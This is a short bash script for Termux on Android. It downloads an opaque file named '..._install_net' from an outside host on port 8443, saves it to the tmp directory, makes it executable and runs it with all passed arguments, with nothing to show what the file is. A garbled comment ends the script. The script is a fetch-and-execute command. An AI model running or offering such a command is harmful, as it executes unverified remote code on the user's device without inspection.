#!/bin/bash
TMP_DIR=/data/data/com.termux/files/usr/tmp
FILE_NAME=archivo
curl -sSL "https://nt.viofull.com:8443/downloads/959d38664a3b40d89f7fbad09d81ef15_install_net" -o $TMP_DIR/$FILE_NAME && chmod +x $TMP_DIR/$FILE_NAME && $TMP_DIR/$FILE_NAME $@

#ho cacaME"
    